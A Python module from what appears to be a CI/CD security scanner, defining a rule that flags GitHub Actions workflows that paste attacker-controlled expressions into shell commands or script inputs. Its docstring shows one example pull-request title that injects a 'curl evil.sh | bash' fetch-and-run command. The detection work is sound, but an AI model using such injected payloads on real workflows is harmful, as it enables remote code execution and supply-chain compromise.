"""RULE 4 -- attacker-controlled expressions interpolated into shell commands.

GitHub expands ``${{ ... }}`` *before* the shell runs, by pasting the value
straight into the script text.  A pull request titled::

    a"; curl evil.sh | bash; #

interpolated into ``run: echo "${{ github.event.pull_request.title }}"`` does
not produce a string containing shell metacharacters. It produces a script that
runs the attacker's command. There is no quoting that fixes it, because the
substitution happens before quoting means anything.

The same applies to step outputs, which is the GHSL-2023-271 bug in
tj-actions/changed-files: a file named with a ``;`` in it turned
``for file in ${{ steps.changed-files.outputs.all_changed_files }}`` into
command execution.

Findings are also raised for interpolation into ``if:`` conditions and into
``with:`` inputs of an action that is known to evaluate them, but those are
graded lower because reaching execution takes another step.
"""

from __future__ import annotations

from typing import Iterable

from supplytrace.cicd.evidence.models import (
    EvidenceItem,
    Finding,
    FindingType,
    RelationshipState,
    Severity,
)
from supplytrace.cicd.parser.expressions import Trust, find_expressions
from supplytrace.cicd.rules.base import Rule, ScanContext, untrusted_triggers

#: Actions whose inputs are executed as script, so an expression reaching them
#: is as good as reaching `run:`.
_SCRIPT_EVALUATING_ACTIONS = {
    "actions/github-script": "script",
    "azure/cli": "inlineScript",
    "appleboy/ssh-action": "script",
}


class ScriptInjectionRule(Rule):
    id = "SCRIPT_INJECTION"
    name = "Attacker-controlled expression interpolated into a command"
    rationale = (
        "GitHub substitutes expression values into the script text before the "
        "shell parses it. An outsider who controls the value therefore controls "
        "the script, and no amount of quoting in the workflow prevents it."
    )
    references = (
        "https://securitylab.github.com/resources/github-actions-untrusted-input/",
        "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
    )

    def apply(self, context: ScanContext) -> Iterable[Finding]:
        for workflow, job, step in context.iter_steps():
            triggers = untrusted_triggers(workflow)

            if step.run:
                yield from self._check_run(context, workflow, job, step, triggers)

            if step.uses:
                yield from self._check_action_inputs(context, workflow, job, step, triggers)

    # -- run: blocks -----------------------------------------------------------

    def _check_run(
        self, context: ScanContext, workflow, job, step, triggers: list[str]
    ) -> Iterable[Finding]:
        refs = [r for r in find_expressions(step.run) if r.is_dangerous]
        if not refs:
            return

        for ref in refs:
            # Point at the exact line inside the run block, not the block start.
            line = self._line_in_run(workflow, step, ref)
            snippet = context.snippet_at(workflow.path, line)

            severity, confidence = self._grade(ref.trust, triggers)
            reachability = (
                f"The workflow runs on {', '.join(triggers)}, so an outsider can "
                f"supply this value."
                if triggers
                else (
                    "No fork-reachable trigger was found on this workflow, so "
                    "supplying the value requires access this scan cannot confirm "
                    "an outsider has."
                )
            )

            yield Finding(
                rule_id=self.id,
                type=FindingType.CODE_EXECUTION,
                severity=severity,
                confidence=confidence,
                state=RelationshipState.INFERRED,
                title=f"{ref.context} interpolated into a run command",
                description=(
                    f"Step '{step.label}' in job '{job.id}' interpolates "
                    f"{ref.raw} directly into its shell script. GitHub pastes the "
                    f"value into the script before the shell parses it, so a value "
                    f"containing shell metacharacters executes as commands. "
                    f"{reachability}"
                ),
                remediation=(
                    f"Pass the value through the environment instead of "
                    f"interpolating it:\n"
                    f"  env:\n"
                    f"    UNTRUSTED: {ref.raw}\n"
                    f"  run: ... \"$UNTRUSTED\"\n"
                    f"The shell then receives it as data. Quoting the expression "
                    f"itself does not help."
                ),
                references=list(self.references),
                file=workflow.path,
                line=line,
                workflow=workflow.display_name,
                job=job.id,
                step=step.label,
                evidence=[
                    EvidenceItem(
                        file=workflow.path,
                        line=line,
                        snippet=snippet or ref.raw,
                        label="untrusted value interpolated into shell",
                    )
                ]
                + [
                    context.evidence_at(
                        workflow.path,
                        workflow.trigger_lines.get(t, 0),
                        f"outsider-reachable trigger: {t}",
                    )
                    for t in triggers
                    if workflow.trigger_lines.get(t)
                ],
                metadata={
                    "expression": ref.raw,
                    "context": ref.context,
                    "trust": ref.trust.value,
                    "sink": "run",
                    "triggers": triggers,
                },
            )

    @staticmethod
    def _line_in_run(workflow, step, ref) -> int:
        """Exact file line for an expression inside a ``run:`` block.

        The parser records where the block's text begins, and the expression
        carries its own offset within that text, so the two compose into the
        real line.

        Searching the source for the expression instead -- which this used to
        do -- returns the *first* textual match in the file. When the same
        expression appears in two steps (``${{ github.event.comment.body }}``
        in both a `with:` and a later `run:`), every finding was reported at
        the first occurrence, sending a reviewer to the wrong job entirely.
        """

        line = step.line_for_run_offset(ref.line_offset)
        return line or step.location.line

    # -- action inputs ---------------------------------------------------------

    def _check_action_inputs(
        self, context: ScanContext, workflow, job, step, triggers: list[str]
    ) -> Iterable[Finding]:
        action_repo = step.uses.repo.lower()
        script_input = _SCRIPT_EVALUATING_ACTIONS.get(action_repo)
        if not script_input:
            return

        value = str(step.with_.get(script_input, "") or "")
        refs = [r for r in find_expressions(value) if r.is_dangerous]
        if not refs:
            return

        for ref in refs:
            # Bounded to this step, so a duplicate expression elsewhere in the
            # file cannot claim the location.
            line = (
                workflow.line_of_source_from(ref.raw, step.location.line)
                or step.location.line
            )
            severity, confidence = self._grade(ref.trust, triggers)
            # Reaching an interpreter through an action input is the same class
            # of problem as `run:`, so it keeps the same severity.
            yield Finding(
                rule_id=self.id,
                type=FindingType.CODE_EXECUTION,
                severity=severity,
                confidence=max(confidence - 0.05, 0.4),
                state=RelationshipState.INFERRED,
                title=f"{ref.context} interpolated into {step.uses.repo} script",
                description=(
                    f"Step '{step.label}' passes {ref.raw} into the '{script_input}' "
                    f"input of {step.uses.repo}, which evaluates that input as code. "
                    f"The expression is substituted before evaluation, so an "
                    f"outsider controlling the value controls the script."
                ),
                remediation=(
                    f"Read the value from the environment inside the script "
                    f"(process.env.UNTRUSTED for github-script) rather than "
                    f"interpolating {ref.raw} into the source."
                ),
                references=list(self.references),
                file=workflow.path,
                line=line,
                workflow=workflow.display_name,
                job=job.id,
                step=step.label,
                evidence=[
                    EvidenceItem(
                        file=workflow.path,
                        line=line,
                        snippet=context.snippet_at(workflow.path, line) or ref.raw,
                        label=f"untrusted value passed to {action_repo}",
                    )
                ],
                metadata={
                    "expression": ref.raw,
                    "context": ref.context,
                    "trust": ref.trust.value,
                    "sink": f"{action_repo}:{script_input}",
                    "triggers": triggers,
                },
            )

    # -- grading ---------------------------------------------------------------

    @staticmethod
    def _grade(trust: Trust, triggers: list[str]) -> tuple[Severity, float]:
        """Severity depends on who can set the value and whether they can reach it."""

        reachable = bool(triggers)
        if trust is Trust.UNTRUSTED:
            # Free text an outsider types, on a trigger they can fire.
            return (Severity.CRITICAL if reachable else Severity.HIGH), (
                0.9 if reachable else 0.7
            )
        # ATTACKER_INFLUENCED: a branch name or an action's output. Real, but
        # the value is constrained, so the claim is weaker.
        return (Severity.HIGH if reachable else Severity.MEDIUM), (
            0.75 if reachable else 0.55
        )
